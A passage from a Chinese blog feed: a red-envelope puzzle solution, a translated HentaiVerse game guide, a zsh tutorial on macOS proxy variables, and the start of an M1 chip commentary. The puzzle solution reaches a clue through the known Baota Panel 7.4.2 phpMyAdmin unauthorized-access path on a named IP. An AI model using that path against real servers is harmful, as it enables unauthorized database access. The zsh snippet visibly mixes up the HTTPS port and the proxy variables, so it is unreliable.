src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/index.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2000\" height=\"1125\" class=\"aligncenter size-full wp-image-2444\"></a>\n<p>今年八月宝塔面板 7.4.2 的 phpMyAdmin 未授权访问漏洞很多人都知道了，如果你不清楚，搜索“宝塔面板 7.4.2”也能找到相关信息。首先找到 <code>rp.dlij.site</code> 对应的 IP 是 <code>121.196.27.125</code>，访问 <code>http://121.196.27.125:888/pma</code> 即可看到一个 phpMyAdmin 的界面（为了把这个页面扒下来我还装了一个真的宝塔面板…）。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/pma.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/pma.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1600\" height=\"867\" class=\"aligncenter size-full wp-image-2448\"></a>\n<p>可以看到信息是 <code>7972632E6D652F6738546D444A3132</code>。和前年一样，这其实是十六进制的 ASCII 码，每两位转为 ASCII 字符即可得到 <code>yrc.me/g8TmDJ12</code>。访问这个页面，可以看到如下信息。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/apl.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/apl.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1500\" height=\"248\" class=\"aligncenter size-full wp-image-2447\"></a>\n<p>这是 APL，一种有趣的函数式编程语言。你可能不了解它，但只要你搜索网页的 <code>title</code>，就能找到这个在线运行 APL 的页面：<a href=\"https://tryapl.org/\">TryAPL</a>。在这个页面中粘贴这段代码，即可得到 <code>https://rp.dlij.site/2021/2554038.75</code>。访问这个 URL，可以看到一张图。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021-b.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021-b.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"720\" height=\"960\" class=\"aligncenter size-full wp-image-2445\"></a>\n<p>连续三年的传统艺能了，压缩包藏在了图片里。下载图片，将后缀改为 .zip 然后打开，可以看到一个 README.md。其中要求我们去 <code>ws://121.196.27.125:8080/NvAhoZ9@H2Au</code> 获取最终红包口令码。这是一个 WebSocket 协议的地址，在浏览器中开一个新 Console，执行 <code>new WebSocket('ws://121.196.27.125:8080/NvAhoZ9@H2Au')</code> 即可在 Network 选项卡中看见服务器下发的红包口令码。当然，别忘了将其反转。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/message.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/message.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"475\" height=\"179\" class=\"aligncenter size-full wp-image-2446\"></a>\n<h1>跨年海报</h1>\n<p>依然是传统艺能，今年的海报只用到了 PS。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"2021\" width=\"720\" height=\"960\" class=\"aligncenter size-full wp-image-2407\"></a>\n<p>提前祝各位新年快乐！</p>\n","link":"https://flyhigher.top/diary/2405.html"},{"title":"[译] HentaiVerse 建议和指导","date":"2020-12-24 22:31:00","description":"\n<p>著名的同人本资源集散地 E-hentai 有一个完全没有人在意的角落 ——「HentaiVerse」，一个纯文字网页 RPG 游戏。虽然这个游戏应该不会有太多新玩家了，不过还是翻译一篇给新玩家的指导文吧。</p>\n<span></span><blockquote><p>原文标题：HentaiVerse Advice<br>原文作者：<a href=\"https://ehwiki.org/action/history/Talk:HentaiVerse_Advice\">作者列表</a><br>原文链接：<a href=\"https://ehwiki.org/wiki/HentaiVerse_Advice\">https://ehwiki.org/wiki/HentaiVerse_Advice</a><br>原文授权协议：GNU Free Documentation License 1.2+<br>本文由 <a href=\"https://skk.moe/\">Sukka</a> 翻译，首发于 <a href=\"https://blog.skk.moe/\">Sukka’s Blog</a></p></blockquote>\n<h2>译者的话</h2>\n<ul>\n<li>本文不是 HentaiVerse 新手教程文。想入新手村请左转百度贴吧「HV 网页游戏吧」置顶帖、右转 E-hentai 社区<a href=\"https://forums.e-hentai.org/index.php?showtopic=189266\">「中文指引」帖</a>。</li>\n<li>本文假设你对 HentaiVerse 有一定程度的了解。如果你不满足这个前提，请先去阅读 <a href=\"https://ehwiki.org/\">EHWiki</a>。</li>\n<li>本文的作者都是 E-hentai 社区中受人敬仰的资深玩家、亦或是 E-hentai 社区 HentaiVerse 版块的管理员，但毫无疑问这并非你唯一的玩法选择，译者本人的玩法风格就与本文的建议背道而驰（截至本文译就，译者为 360 级，装备搭配是 西洋 + 超高格挡圆盾 + 全身轻甲）。</li>\n<li>HentaiVerse 带来的收益其实很有限，尤其是当你要解锁 HentaiVerse 相关的 Hath Perks 时。不过如果你是为了赚 Credit 和 GP 才来玩 HentaiVerse 的话，之后你也不会有心思看本子的。</li>\n</ul>\n<h2>路线指导</h2>\n<h3>50 级之前</h3>\n<p>在这个阶段，你完全不必在意选择 <a href=\"https://ehwiki.org/wiki/Play_Styles/Chinese\">战士或法师</a>，也不必在乎 <a href=\"https://ehwiki.org/wiki/Fighting_Styles/Chinese\">战斗风格</a>。保持你的主属性均衡分布（译者注：即中文玩家圈口中的「水桶加点」）。此时游戏的难度和花费都是微不足道的，你可以试一试每一种玩法和风格。</p>\n<h3>51 级到 199 级</h3>\n<p>200 级以前推荐走战士的路线。<a href=\"https://ehwiki.org/wiki/Fighting_Styles#Two-Handed\">双手武器</a> + <a href=\"https://ehwiki.org/wiki/armor\">轻甲</a> 是个不错的选择，使用西洋剑和盾牌的 <a href=\"https://ehwiki.org/wiki/Fighting_Styles#One-Handed\">单手</a> 风格也值得一试。这两种玩法可以提供最佳的生存可能，因此你可以提前尝试更高的 <a href=\"https://ehwiki.org/wiki/difficulties\">难度</a>，而更高的难度意味着更好的掉落。</p>\n<p>不建议这个阶段的玩家尝试法师，因为法师是一种游走在边缘的危险玩法，如果你没有很好的装备和咒语，那么很大几率你在杀死敌人之前会先被敌人干掉。这并不是说你不能选择法师，但是你很难在更高的难度下通关。</p>\n<p>继续维持主属性均衡分布，INT 除外（译者注，一般推荐 INT 值为当前等级的 60% 到 70%，以保证足够的 SP 值用于维持灵动架势）。每 30 级左右就更换一次装备，考虑到你现在用的装备都不推荐魂绑，所以使用和你等级接近的装备显然更合适。</p>\n<h3>200 级到 319 级</h3>\n<p>怪物会因为可以使用灵力攻击而变得更强大。在这个阶段，建议用西洋剑玩单手盾战风格，西洋剑的后缀应该是「杀戮」或「平衡」，盾牌的类型则推荐力场盾、不过最关键的是盾牌的「格挡率」越高越好。这个阶段推荐使用重甲，最好是带有 Power 前缀的。「杀戮」后缀的重甲减伤一般而伤害加成更高，价格也更贵。</p>\n<p>此时仍然不推荐法师风格，因为 310 级以前你没法点满「Faster Imperil」。除非你的装备非常好，否则你必须要大量使用「Imperil」技能，而这个等级下的装备是非常昂贵的。</p>\n<h3>320 级以上</h3>\n<p>法师突然变成一个非常可行的选择。杀戮后缀的西洋剑 + 立场盾 + Power 前缀杀戮后缀重甲 也很不错。法师装备更贵、依赖 Supportive 咒语生存，但是清关的速度更快（译者注：法师清关龙场一般不会超过 2000 turn、但盾战需要至少 8000 turn）。</p>\n<h2>风格指导</h2>\n<h3>法师</h3>\n<ul>\n<li>只使用布甲和法杖</li>\n<li>法师可以施放除「虚空伤害」以外的所有伤害类型的法术</li>\n<li>可以对一片怪物造成伤害</li>\n<li>可以借助元素爆炸的优势</li>\n<li>0 干扰、极低的负重，因此魔法消耗和行动速度很快</li>\n<li>缓伤效果较差</li>\n</ul>\n<h3>战士</h3>\n<p>不论你是哪一种战士，友情小马炮永远是你最好的朋友。</p>\n<h4>轻甲</h4>\n<ul>\n<li>中等水平的缓伤、干扰、负重，低穿刺缓伤、低回避率</li>\n<li>暗影类轻甲可以提供更高的伤害加成，0 干扰，相对更高的回避率，但缓伤较低、完全不能免疫穿刺伤害</li>\n</ul>\n<h4>重甲</h4>\n<ul>\n<li>最高的缓伤效果，但是干扰和负重也最高</li>\n<li>Power 前缀的动力甲可以提供不错的伤害加成</li>\n</ul>\n<h4>单手</h4>\n<ul>\n<li>搭配盾牌可以带来不错的格挡率加成，有效提升生存率</li>\n<li>「压倒性的攻击」技能可以增加伤害、命中率和招架率</li>\n<li>反击可以增加斗气，让你可以频繁地使用「Fighting Skills」和保持住「灵动架势」</li>\n</ul>\n<h4>双持</h4>\n<ul>\n<li>对单个目标的伤害最高，适合浴血擂台（Ring of Blood）和传奇竞技场</li>\n<li>可以打出两个效果（如同时打出「眩晕」和「刺甲」）</li>\n<li>三阶段「Fighting Skills」可以击中多个目标</li>\n<li>由于没有盾牌、格挡率加成极低，只能靠回避率和招架率生存</li>\n<li>攻击速度和命中率极高，但生存率很一般</li>\n</ul>\n<h4>双手</h4>\n<ul>\n<li>「Domino Strike」可以命中多个目标</li>\n<li>易于同时攻击多个目标</li>\n</ul>\n<h4>二天一流</h4>\n<ul>\n<li>搭配日本刀 + 胁差的玩法风格</li>\n<li>同时拥有部分双手和双持的优势</li>\n<li>「Domino Strike」只能命中不超过 5 个目标</li>\n<li>副手没有招架加成</li>\n<li>适合 100 级以下的玩家或 300 级以上的玩家</li>\n</ul>\n<h2>培养方向</h2>\n<h3>技能点</h3>\n<p>这一节的内容适用于所有风格，不论是法师、战士还是战法师。</p>\n<p>不要把技能点浪费在你不主动使用的能力上（比如你是一名元素法师，就不应该加圣、暗的技能），技能只有在装配在支配槽中才会起作用。在低等级时你升级获得的技能点会远比你需要的多，但是到 200 级以后你的技能点就会不够用了。你需要通过 <a href=\"https://ehwiki.org/wiki/training\">训练</a>「Ability Boost」来获得更多的技能点。</p>\n<h4>应该加的技能</h4>\n<ul>\n<li>HP Tank（非常重要）：血条，直接决定你的生存几率</li>\n<li>MP Tank（非常重要）：蓝条，非常有用</li>\n<li>Better Cure（非常重要）：减少冷却时间、增加治疗的 HP 量。在 HentaiVerse 里 HP 药水效果一般，你会更依赖治疗咒语。</li>\n<li>Better Regen（非常重要）：提供更有效且更持久的回血</li>\n<li>Better Protection（非常重要）：极大地提升生存几率</li>\n<li>对应装备和战斗风格的技能（非常重要）：随着熟练度提升将有效提升你的任务属性</li>\n<li>Better Mana Pots（重要）：MP 药水是战斗必带的回复品</li>\n<li>Better Haste（重要）：增加你攻击、施法的速度，因此你可以攻击更多的怪物，有效提升你的生存几率</li>\n<li>Stronger Spirit（重要）：让灵力盾可以消耗更少的 SP、更早的抵御攻击</li>\n<li>SP Tanks（重要）：对于战士来说，这是保持灵动架势必备的。而灵力盾和生命火花也依赖 SP 才能发挥作用</li>\n<li>Better Shadow Veil：更高的回避率加成意味着更高的生存几率</li>\n<li>Better Imperil（可选）：削弱怪物的缓伤，对于法师来说是个不错的选择</li>\n<li>Faster Imperil（可选）：降低 Imperil 的消耗和冷却时间、增加受影响的目标，特别适合法师</li>\n<li>Better Spark（可选）：大部分玩家都会通过 IA 自动施放生命火花，此时只能帮助你减少 MP 消耗。一旦你升到 150 级以上，你就会经常看到带有 SP 条的怪物了，而怪物的 SP 攻击可以对你造成极大的伤害、甚至能秒杀你，而生命火花就是你的最后一道保障（译者注：「生命火花」类似于 Minecraft 的「不死图腾」）</li>\n</ul>\n<h4>不推荐的技能</h4>\n<ul>\n<li>Better Drain：造成的伤害非常有限</li>\n<li>Faster Drain：枯竭咒语本身的施法速度就够快了，而冷却时间却不会变短很多</li>\n<li>Better Absorb：很一般的咒语，大部分怪物并不会进行魔法攻击。只有在打 Boss 时会有点用</li>\n<li>Better Slow：Better MagNet 显然是个更合适的选择</li>\n<li>Mind Control：并没有什么用</li>\n<li>Better Blind 和 Faster Blind：Weaken 咒语效果更明显</li>\n<li>Ether Theft：对法师来说是多余的</li>\n</ul>\n<h3>法师哲学</h3>\n<p>法师是一种游走在边缘的职业，尝试在怪物秒杀你之前 秒杀他们。</p>\n<ul>\n<li>310 级以前不建议尝试</li>\n<li>依赖高伤害和回避率生存</li>\n<li>高投入、高回报</li>\n</ul>\n<h3>战士哲学</h3>\n<ul>\n<li>通过高缓伤和再生咒语生存，使用格挡、回避和招架防御。</li>\n<li>战士也需要 MP 维持 BUFF，必要时还要使用 DEBUFF</li>\n<li>200 级以前，尽量确保命中率高于 100%</li>\n</ul>\n<h2>难度调整</h2>\n<p>随着你的等级不断提升，你将会遇见更强大的怪物，战力大多都在 400 以上（拥有 SP 攻击的能力）。从 150 级开始难度就会显著增加，因此你应该适时做一些难度调整。</p>\n<ul>\n<li>尽量选择 Hard 以上难度，以便获得 Shard</li>\n<li>获得更好的装备（尤其是武器），数值比装备等级更重要</li>\n<li>多多使用 BUFF 和 DEBUFF</li>\n<li>第一个 IA 自动施法槽只需要 50H，非常非常非常非常划算的投资</li>\n</ul>\n<h2>装备</h2>\n<p>等级较低的玩家应该多逛逛 E-hentai 社区，领取免费装备和每周的补给（药水、卷轴等）。品质高的装备的属性不一定比品质低的装备好，因此选择和更换装备时三思而后行。</p>\n<h2>物品</h2>\n<ul>\n<li>药水是拿来喝的，不是拿来收藏的。</li>\n<li>喝药水和使用卷轴不计入 turn，所以为啥不多用用呢？</li>\n<li>长效药一般用于较长的战斗，普通药水用于应急，丹药（译者注：中文圈玩家一般称之为「大药」）是在紧急情况下、普通药水的冷却时间还没过、或想要同时获得两种效果时使用的。一些老玩家会给新玩家发放免费药水，去 E-hentai 社区 HentaiVerse 版块的 WTS 分区里看看？</li>\n<li>浴血擂台中 Flying Spaghetti Monster 是性价比最高的，其余的挑战通一次就够了。</li>\n<li>只有你自信能在 PFUDOR 难度打败 Triple Trio and the Tree 时再去刷。</li>\n</ul>\n<h2>怪物实验室</h2>\n<ul>\n<li>你想什么时候去看看就去，只需要记住怪物给予礼物的间隔至少为一小时，而且较弱的怪物一般很少给予礼物。</li>\n<li>如果一个怪物过去 3 天没有给你礼物的怪物，那么接下来他一定会给予你一个礼物。</li>\n<li>怪物的名字越有趣越好，不要用序号或者脸滚键盘为怪物取名。</li>\n</ul>\n<h2>雪花祭坛和奖杯</h2>\n<ul>\n<li>你可以通过献祭奖杯换取装备，也可以随时将它们卖掉。它们在雪花祭坛的价值不会改变，因此囤积它们没有实际意义。</li>\n<li>奖杯永远不要卖给系统店，要么献祭掉、要么卖给玩家（比系统店的价格要高得多）。</li>\n</ul>\n<h2>训练</h2>\n<p>训练会极大程度的消耗你的 Credits，并且除了 Adept Learner 和 Ability Boost 以外很难给你提供太多加成：将 Scavenger 训练满将会花费你 1700 万 Credit，但是掉落几率不过从 10% 提升到 12.5% 而已（译者注：在中文圈玩家中，四个增加掉落率的训练被称为「四大」，因为「四大皆空」）。</p>\n<h2>武器店和道具店</h2>\n<p>武器店里卖的装备要么等级太高、要么等级太低，不如在 社区 HentaiVerse 版块的 WTS 分区里直接向玩家购买。道具店里的东西一般很贵，WTS 版块里要便宜一些，但是去 <a href=\"https://hvmarket.xyz/\">HVMarket</a> 购买最划算。</p>\n<h2>熔炉</h2>\n<ul>\n<li>每项属性的前 5 次升级都不消耗站粘合剂，性价比高；而当你分解装备时，强化材料的 90% 原料都会返还给你，因此在低等级时升级装备还是相对划算的。</li>\n<li>叠加装备附魔不会增强效果，只会增加持续的时间。</li>\n<li>当你装备获得了不想要的潜能时，马上重新锻造它，因为每一级装备潜能意味着需要一片重铸碎片。</li>\n<li>除非你是土豪，否则不要购买灵魂碎片。每天打遭遇战可以获得至多 60 片灵魂碎片。</li>\n</ul>\n<div class=\"license\"> <div class=\"license-title\">[译] HentaiVerse 建议和指导</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hentaiverse-advice/\">https://blog.skk.moe/post/hentaiverse-advice/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-12-24</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hentaiverse-advice/"},{"title":"ZSH 自动读取 macOS 系统代理配置并设置环境变量","date":"2020-12-07 02:47:00","description":"\n<p>和其它 Linux 的 DE 一样，macOS 也支持在「系统偏好设置」中设置 HTTP 代理、HTTPS 代理，但是 macOS 并不会在终端（Terminal、iTerm）的 shell 中自动生效系统代理配置。为了方便日常使用，我决定好好研究一下 macOS 的系统代理。</p>\n<h2>macOS 系统代理的行为</h2>\n<p>和 Linux 和 Windows 只有一种系统代理配置不同，macOS 为每一种网络设备（Wi-Fi、Ethernet、Bluetooth PAN 等）维护了独立的网络配置，包括代理配置在内。因此当切换网络设备时，macOS 会使用不同的代理配置；如果同时连接了多个网络设备，则操作系统会优先采用在「系统偏好设置」网络「Service Order」靠上的设备的代理配置：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.3/1.png\" class=\"lazy post-img\"></p>\n<p>和大部分 Linux 桌面环境一样，系统偏好设置中的代理设置在 shell session 中是不会生效的，在终端中使用代理、需要手动提供 <code>HTTP_PROXY</code>、<code>HTTPS_PROXY</code> 和 <code>ALL_PROXY</code> 环境变量。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.3/2.png\" class=\"lazy post-img\"></p>\n<h2>在终端获取 macOS 系统代理配置</h2>\n<p>macOS 内置了许多实用的命令行工具，如 <code>xcode-select</code> 用于安装命令行工具和配置 Xcode、<code>build_webkit</code> 用于编译 WebKit、<code>softwareupdate</code> 用于获取系统更新等。在读取系统代理配置方面，macOS 提供了三种方法：</p>\n<pre><code class=\"hljs bash\">$ system_profiler SPNetworkDataType <span class=\"hljs-comment\"># 获取完整网络配置信息</span>$ networksetup -listallnetworkservices <span class=\"hljs-comment\"># 列举所有网络设备</span>$ networksetup -getwebproxy Wi-Fi <span class=\"hljs-comment\"># 获取特定网络设备的系统代理配置</span>$ scutil --proxy <span class=\"hljs-comment\"># 获取当前已启用的代理配置，是对 system_profiler 的封装</span></code></pre>\n<p>其中，第三种命令的输出最简洁，适合在 shell 中解析：</p>\n<pre><code class=\"hljs bash\">$ scutil --proxy&lt;dictionary&gt; {  ExceptionsList : &lt;array&gt; {    0 : 127.0.0.1    1 : 192.168.0.0/16    2 : 10.0.0.0/8    3 : 172.16.0.0/12    4 : 100.64.0.0/10    5 : 17.0.0.0/8    6 : localhost    7 : *.<span class=\"hljs-built_in\">local</span>    8 : 169.254.0.0/16    9 : 224.0.0.0/4    10 : 240.0.0.0/4  }  ExcludeSimpleHostnames : 1  HTTPEnable : 1  HTTPPort : 6152  HTTPProxy : 127.0.0.1  HTTPSEnable : 1  HTTPSPort : 6152  HTTPSProxy : 127.0.0.1  SOCKSEnable : 1  SOCKSPort : 6153  SOCKSProxy : 127.0.0.1}</code></pre>\n<h2>解析 <code>scutil</code> 输出</h2>\n<p>虽然使用 <code>awk</code> 可以轻易解析上述输出，但是正如我在「<a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</a>」一文中所介绍的，应避免使用外部进程、尽可能使用 zsh 内置语法。而应对字符串操作，zsh 也已经绰绰有余了。</p>\n<p>首先，为了获取代理配置不可避免的要生成一个 <code>scutil</code> 的子进程，为了避免子进程的反复生成，应该把输出缓存下来：</p>\n<pre><code class=\"hljs bash\">SCUTILS_PROXY=$(scutil --proxy)</code></pre>\n<p>接着判断代理是否启用。如果配置了代理，则 <code>xxEnable :</code> 的字段值为 1，反之则字段值为 0 或直接整个字段不存在，因此可以使用 zsh 字符串搜索语法搜索 <code>xxEnable : 1</code>，以 HTTP 代理为例：</p>\n<pre><code class=\"hljs bash\">HTTP_PROXY_ENABLED_PATTERN=<span class=\"hljs-string\">\"HTTPEnable : 1\"</span><span class=\"hljs-keyword\">if</span> (( <span class=\"hljs-variable\">$SCUTILS_PROXY</span>[(I)<span class=\"hljs-variable\">$HTTP_PROXY_ENABLED_PATTERN</span>] )); <span class=\"hljs-keyword\">then</span>  <span class=\"hljs-comment\"># HTTP 代理已启用</span><span class=\"hljs-keyword\">fi</span></code></pre>\n<blockquote><p><code>(I)</code> 是 zsh 中的字符串从右往左搜索的语法，返回值为找到匹配时的位置；当没有找到匹配时，zsh 会一路搜索到字符串最左侧、最终返回值是 0。因此 <code>(I)</code> 常见的用法是配合数值条件 <code>(( ))</code> 判断变量是否包含某一字符串，这种写法的性能是 <code>[[ ]]</code> 的三倍。</p></blockquote>\n<p>接下来是获取代理的主机名和端口，HTTP 代理使用到的字段是 <code>HTTPProxy</code> 和 <code>HTTPPort</code>。使用 zsh 的「左端最小匹配截断」语法截取 <code>HTTPProxy</code> 字段内容：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>127.0.0.1  HTTPSEnable : 1  HTTPSPort : 6152  HTTPSProxy : 127.0.0.1  SOCKSEnable : 1  SOCKSPort : 6153  SOCKSProxy : 127.0.0.1}</code></pre>\n<blockquote><p><code>#*</code> 是「左端最小匹配截断」、<code>##*</code> 是「左端最大匹配截断」，此外还有 <code>%*</code> 和 <code>%%*</code>，分别是「右端最小匹配截断」和「右端最大匹配截断」</p></blockquote>\n<p>接下来是使用 zsh 的多行字符串语法获取第一行内容、以将右端多余的内容略去：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>[(f)1]}</span>127.0.0.1</code></pre>\n<blockquote><p>使用 zsh 内置的 <code>(f)</code> flag 用于多行字符串的遍历和截断，比调用外部进程 <code>head</code> 要快得多</p></blockquote>\n<p>用同样的方法获取端口字段的内容：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPSPort : }</span>[(f)1]}</span>6152</code></pre>\n<p>最后拼凑字段、添加到环境变量即可：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-keyword\">if</span> (( <span class=\"hljs-variable\">$SCUTILS_PROXY</span>[(I)<span class=\"hljs-variable\">$HTTP_PROXY_ENABLED_PATTERN</span>] )); <span class=\"hljs-keyword\">then</span>    HTTP_PROXY_HOST=<span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>[(f)1]}</span>    HTTP_PROXY_PORT=<span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPSPort : }</span>[(f)1]}</span>    <span class=\"hljs-built_in\">export</span> http_proxy=<span class=\"hljs-string\">\"http://<span class=\"hljs-variable\">${HTTP_PROXY_HOST}</span>:<span class=\"hljs-variable\">${HTTP_PROXY_PORT}</span>\"</span>    <span class=\"hljs-built_in\">export</span> HTTP_PROXY=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">${https_proxy}</span>\"</span><span class=\"hljs-keyword\">fi</span></code></pre>\n<p>同理，用相同的方法可以获取到其它代理服务器配置。将代码添加到 <code>.zshrc</code> 中，每次新建一个 shell session 时即可自动读取并添加相关环境变量。</p>\n<h2>zsh-osx-autoproxy</h2>\n<p>基于上述介绍的方法，我封装了一个 oh-my-zsh 插件 <a href=\"https://github.com/SukkaW/zsh-osx-autoproxy\">zsh-osx-autoproxy</a>，启用插件后即可自动获取 HTTP 代理、HTTPS 代理、FTP 代理的设置，并在当前 shell 环境中添加相应环境变量（<code>HTTP_PROXY</code>、<code>HTTPS_PROXY</code>、<code>ALL_PROXY</code>、<code>FTP_PROXY</code>）。oh-my-zsh 用户可以通过下述命令完成安装：</p>\n<pre><code class=\"hljs bash\">git <span class=\"hljs-built_in\">clone</span> https://github.com/sukkaw/zsh-osx-autoproxy <span class=\"hljs-variable\">${ZSH_CUSTOM:-~/.oh-my-zsh/custom}</span>/plugins/zsh-osx-autoproxy<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"plugins+=(zsh-osx-autoproxy)\"</span> | tee -a .zshrc</code></pre>\n<p>新建一个终端会话（或使用 <code>source ~/.zshrc</code>） 即可生效。</p>\n<div class=\"license\"> <div class=\"license-title\">ZSH 自动读取 macOS 系统代理配置并设置环境变量</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/\">https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-12-07</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/"},{"title":"谈谈 Apple M1 芯片、ARM、ARM Mac 和黑苹果的未来","date":"2020-11-11 16:13:00","description":"\n<p>2020 年 11 月 11 日，苹果在本年度最后一次 Apple Events 上发布了全新的 ARM 芯片 M1、以及三款搭载了 M1 的 Mac：MacBook Air、MacBook Pro 13‘ 和 Mac Mini。在 WWDC 2020 库克宣布 Apple Silicon 后，这次 Apple Events 再一次掀起了热潮，不少 KOL 都把 M1 奉若神明，不少人也不以为然。本文通过 8 个问题来简单聊聊 M1 和 ARM Mac。</p>\n<h2>M1 芯片的性能如何？</h2>\n<p>本文写就时，搭载 M1 的 Mac 尚未开始发货，我们能看到的只有 GeekBench 上流出的跑分。所以，让我们先从跑分开始看起？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/3.jpg\" alt=\"3\" width=\"1280\" height=\"901\" class=\"lazy post-img\"></p>\n<p>哇！Geekbench 跑分数据告诉我们，M1 和 A14X 可以直接打败 5950X、直接把 Tiger Lake 摁在地上摩擦？这已经不是踩爆 Intel 的牙膏了好伐，这是已经快进到 AMD 原地倒闭了好伐！给 Apple 倒一杯卡布奇诺好吗，快给 Apple 倒一杯卡布奇诺！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/4.jpg\" alt=\"4\" width=\"965\" height=\"569\" class=\"lazy post-img\"></p>\n<p>啊，什么？这 Geekbench 还说 Intel 的 Tiger Lake 可以吊打 4700U？嗯？嗯~？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/1.jpg\" alt=\"1\" width=\"1280\" height=\"893\" class=\"lazy post-img\"></p>\n<p>过了一个小时 Geekbench 就更新了排名数据，所以，现在 5950X 和 5900X 的分数又高过 M1 和 A14X 了？</p>\n<p>看了上面这三张图，你应该大致知道像 Geekbench 这样的跑分纯属娱乐了吧。「众所周知」跑分不代表真实体验。所以我们还是看看苹果发布会上给的图表吧：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/2.png\" alt=\"2\" width=\"1523\" height=\"846\" class=\"lazy post-img\"></p>\n<p>什么，苹果竟然敢说自己的 M1 比最先进的 PC 芯片的性能还要强大 …… 哦，我眼睛业障重啊，这图表的标题后面、还跟着一个「Per Watt（每瓦）」啊。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/5.jpg\" alt=\"5\" width=\"1280\" height=\"818\" class=\"lazy post-img\"></p>\n<p>苹果的意思是，自从 Mac 实装了 M1、Mac 的功耗比直接大幅提升，苹果并没有直接说 M1 性能有多好嘛！你看看苏妈在 AMD 发布会上晒的性能图表、条形图都快超到会场外面去了，苹果你在发布会上搞这么含蓄干什么嘛！</p>\n<p>如果苹果在发布会上只强调能耗比有多么高、功耗有多么低，丝毫不提 M1 的绝对性能，甚至没有透露 M1 的频率，对于 M1 芯片的能耐和优势相信读者也有大概的猜测了。至于苹果在发布会上展示搭载了 M1 的 Mac 比往年的同系列 Mac、CPU 性能提升超过 2.8 倍乃至 3.5 倍、GPU 性能提升则有 5 至 6 倍，我会留给后面「如何评价这率先搭载 M1 的三款 Mac？」问题再谈。</p>\n<h2>对 ARM 架构的处理器性能的一瞥</h2>\n<p>从一开始我就没有怀疑苹果是否能实现用于桌面端的 ARM 芯片。苹果操刀数款移动 CPU 的经历，驾驭 ARM 自然是轻车熟路的。</p>\n<p>那么 ARM 有什么优势呢？在手机和平板上 ARM 大放异彩，近几年几乎再没有看到搭载 X86 的智能手机了；不少 IoT 设备、单片机也开始积极使用 ARM 架构；而桌面端 PC 使用 ARM 的却少之又少。从市场上来看，ARM 架构似乎更适用于低功耗、不强调性能和 CPU 密集型计算的平台，但这并不是意味着 ARM 架构本身没有用于 CPU 密集型计算的潜力。今年 6 月 22 